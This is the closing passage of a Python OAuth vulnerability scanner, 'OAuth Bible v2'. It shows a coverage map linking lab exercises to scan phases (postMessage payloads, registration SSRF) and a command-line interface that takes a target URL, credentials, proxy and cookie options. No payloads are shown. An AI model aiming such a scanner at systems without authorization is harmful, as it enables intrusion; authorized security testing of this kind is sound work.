  Lab 5 (Proxy page steal)    -> Phase 2 (postMessage payloads)
  Lab 6 (SSRF via reg)        -> Phase 8 registration SSRF

{C.BD}v2 KEY DIFFERENCE:{C.RS}
  v1 printed 15x "INFO" = just confirmed phases ran
  v2 {C.R}analyzes HTTP responses{C.RS} -> only reports {C.R}real vulnerabilities{C.RS}
  Every finding has: evidence + reproduce steps + Burp request
""")


# ── CLI ──────────────────────────────────────────────────────────────────────
def main():
    ap=argparse.ArgumentParser(description="OAuth Bible v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
        "  python3 oauth_bible.py -u https://target.com\n"
        "  python3 oauth_bible.py -u https://target.com --proxy http://127.0.0.1:8080\n"
        "  python3 oauth_bible.py -u https://target.com -c CLIENT_ID -o report.json\n"
        "  python3 oauth_bible.py --coverage\n")
    ap.add_argument("-u","--url", help="Target URL")
    ap.add_argument("-c","--client-id", default="", help="client_id")
    ap.add_argument("-s","--client-secret", default="", help="client_secret")
    ap.add_argument("-r","--redirect-uri", default="", help="redirect_uri")
    ap.add_argument("--scope", default="openid profile email")
    ap.add_argument("--proxy", default="", help="Proxy (http://127.0.0.1:8080)")
    ap.add_argument("--timeout", type=int, default=30)
    ap.add_argument("--passive", action="store_true", help="No HTTP requests")
    ap.add_argument("-v","--verbose", action="store_true")
    ap.add_argument("-o","--output", default="", help="JSON report path")
    ap.add_argument("--export-burp", default="", help="Burp requests file")
    ap.add_argument("--coverage", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("--cookie", default="", help="Cookies (name=val;name2=val2)")
    ap.add_argument("-H","--header", action="append", default=[], help="Header (Name: Value)")
    a=ap.parse_args()

    if a.coverage: coverage(); return
    if not a.url: ap.print_help(); print(f"\n{C.R}Error: -u URL required{C.RS}"); sys.exit(1)

    ck={}
    if a.cookie:
        for c in a.cookie.split(";"):
            if "=" in c: k,v=c.split("=",1); ck[k.strip()]=v.strip()
    hd={}
    for h in a.header:
        if ":" in h: k,v=h.split(":",1); hd[k.strip()]=v.strip()

    sc=OAuthBible(a.url, a.client_id, a.client_secret, a.redirect_uri,
                  a.scope, a.proxy, a.timeout, a.passive, a.verbose, ck, hd, a.no_color)
    sc.run()
    if a.output: sc.export_json(a.output)
    if a.export_burp: sc.export_burp(a.export_burp)

if __name__=="__main__": main()
